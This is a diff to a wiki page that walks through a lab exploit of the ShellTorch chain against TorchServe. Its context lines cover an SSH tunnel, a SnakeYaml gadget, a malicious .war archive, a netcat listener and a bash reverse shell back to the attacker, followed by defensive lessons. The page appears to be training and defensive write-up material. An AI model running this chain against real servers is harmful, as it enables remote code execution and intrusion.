@@ -23,8 +23,6 @@ Exploit the ShellTorch vulnerability chain (CVE-2023-43654 + CVE-2022-1471) to a
 
 > Exploit the ShellTorch vulnerability to obtain the flag.
 
----
-
 ## Background: Why Port Forwarding is Needed
 
 TorchServe's management API (port 8081) is bound to localhost inside the target environment — it is not exposed on the external interface. To reach it from the attacker machine, we use **local port forwarding** (`-L`).
@@ -39,8 +37,6 @@ At the same time, the RCE payload needs to call back to the attacker machine. Th
 
 Choose any available local port for `PWNPO` (e.g., 9001).
 
----
-
 ## Step 1: Establish SSH Tunnel
 
 ```bash
@@ -53,8 +49,6 @@ ssh htb-stdnt@STMIP -p STMPO \
 
 Leave this session running. All subsequent commands run in separate terminal tabs.
 
----
-
 ## Step 2: Prepare the Exploit Directory
 
 ```bash
@@ -63,8 +57,6 @@ pip3 install torch-workflow-archiver
 ```
 
 `torch-workflow-archiver` is the official TorchServe tool for packaging model workflows into `.war` archives. We abuse it to package a malicious payload.
-
----
 
 ## Step 3: Create the SnakeYaml Gadget (spec.yaml)
 
@@ -80,8 +72,6 @@ When TorchServe deserializes this YAML, it:
 3. Finds our factory class via the `META-INF/services/` service loader manifest
 4. Instantiates our class, executing the constructor
 
----
-
 ## Step 4: Create the Minimal Handler
 
 ```bash
@@ -93,8 +83,6 @@ EOF
 
 This stub satisfies `torch-workflow-archiver`'s requirement for a handler file.
 
----
-
 ## Step 5: Package the Malicious .war
 
 ```bash
@@ -102,8 +90,6 @@ torch-workflow-archiver --workflow-name student --spec-file spec.yaml --handler 
 ```
 
 This produces `student.war`.
-
----
 
 ## Step 6: Write the Java RCE Payload
 
@@ -146,8 +132,6 @@ public class MyScriptEngineFactory implements ScriptEngineFactory {
 
 Replace `9001` with your chosen `PWNPO` value.
 
----
-
 ## Step 7: Compile and Set Up the Service Loader Structure
 
 Java's `ServiceLoader` mechanism requires the class to be registered in `META-INF/services/` under the interface name:
@@ -176,8 +160,6 @@ work/
         └── javax.script.ScriptEngineFactory
 ```
 
----
-
 ## Step 8: Start Python HTTP Server and Netcat Listener
 
 In two separate terminal tabs:
@@ -191,8 +173,6 @@ cd work && python3 -m http.server 8000
 # Tab 2 — catch the reverse shell
 nc -nvlp 9001
 ```
-
----
 
 ## Step 9: Trigger the SSRF → RCE Chain
 
@@ -217,8 +197,6 @@ bash: no job control in this shell
 ng-8414-aiappsystemmdt-serri-8448b6b595-gbw66:/#
 ```
 
----
-
 ## Step 10: Get the Flag
 
 ```bash
@@ -227,10 +205,6 @@ cat /flag_3dd14dcdd.txt
 ```
 
 The flag file has a randomized suffix — use `ls /` to find the exact filename.
-
-**Flag:** `HTB{5d0f3791aa29e88e75a8bc1c3f05a12b}`
-
----
 
 ## Exploit Chain Summary
 
@@ -243,8 +217,6 @@ Attacker SSH tunnel → TorchServe mgmt API (8081, no auth)
           → Constructor executes: bash reverse shell → attacker's netcat
 ```
 
----
-
 ## Lessons Learned
 
 - **Management APIs bound to localhost still need authentication.** An attacker with any foothold (SSH access, SSRF from another service) can reach localhost-only APIs. Require auth regardless.
@@ -252,13 +224,10 @@ Attacker SSH tunnel → TorchServe mgmt API (8081, no auth)
 - **SnakeYaml's `!!` constructor deserialization should be disabled in production.** Use `SafeConstructor` or a schema that rejects type tags.
 - **Port forwarding as a tunnel:** When a lab requires reaching internal ports, `-L` (local forward) makes remote services accessible locally; `-R` (remote forward) makes local services accessible on the remote host.
 
----
-
 ## Related Pages
 
-- [[attack/ai/vulnerable_ai_systems]] — ShellTorch chain theory and setup reference
-- [[attack/ai/attacking_ai_systems]] — hub page
-- [[definitions/owasp_llm_top10]] — LLM07 (System Prompt Leakage / deployment misconfiguration)
+- [[attack/ai/vulnerable_ai_systems]] — ShellTorch chain theory and CVE reference
+- [[attack/ai/attacking_ai_systems]] — hub page for AI application and system attacks
 
 ## Sources
 
